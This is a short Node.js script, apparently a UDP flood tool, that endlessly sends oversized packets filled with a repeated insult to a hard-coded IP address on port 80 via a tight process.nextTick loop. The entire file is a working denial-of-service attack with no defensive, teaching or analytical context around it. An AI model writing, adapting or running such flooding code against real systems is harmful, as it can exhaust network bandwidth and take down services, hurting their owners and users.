console.log(`\x1b[1;35mUdp Connected...\x1b[0m`);
const dgram = require('dgram');
const ip = '192.168.1.1';
const port = 80;

const client = dgram.createSocket('udp4');

function udp() {
  const teks = Buffer.from('Idiot'.repeat(5096));
  client.send(teks, 0, teks.length, port, ip, (error) => {
    if (error) {
      console.log(error);
    }
  });
}

function udps() {
  udp();
  process.nextTick(udps);
}

udps();
